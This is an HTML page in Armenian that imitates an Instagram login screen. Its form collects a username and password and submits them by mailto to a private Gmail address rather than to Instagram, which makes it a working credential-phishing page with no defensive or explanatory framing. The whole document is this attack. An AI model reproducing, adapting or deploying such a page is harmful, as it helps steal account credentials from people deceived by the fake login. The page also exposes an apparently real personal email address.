<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram Մուտք</title>
    <style>
        /* Համընդհանուր մարմնի կարգավորումներ */
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
        }

        .login-box {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }

        .login-box h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .textbox {
            margin-bottom: 20px;
        }

        .textbox input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .textbox input:focus {
            outline: none;
            border-color: #3f72af;
        }

        .btn {
            background-color: #3f72af;
            color: white;
            border: none;
            padding: 10px 20px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #2a4d8b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h2>Մուտք գործեք Instagram</h2>
            <form action="mailto:karenharutyunyan539@gmail.com" method="post" enctype="text/plain">
                <div class="textbox">
                    <input type="text" name="username" placeholder="Հաշիվ" required>
                </div>
                <div class="textbox">
                    <input type="password" name="password" placeholder="Գաղտնաբառ" required>
                </div>
                <button type="submit" class="btn">Մուտք գործել</button>
            </form>
        </div>
    </div>
</body>
</html>
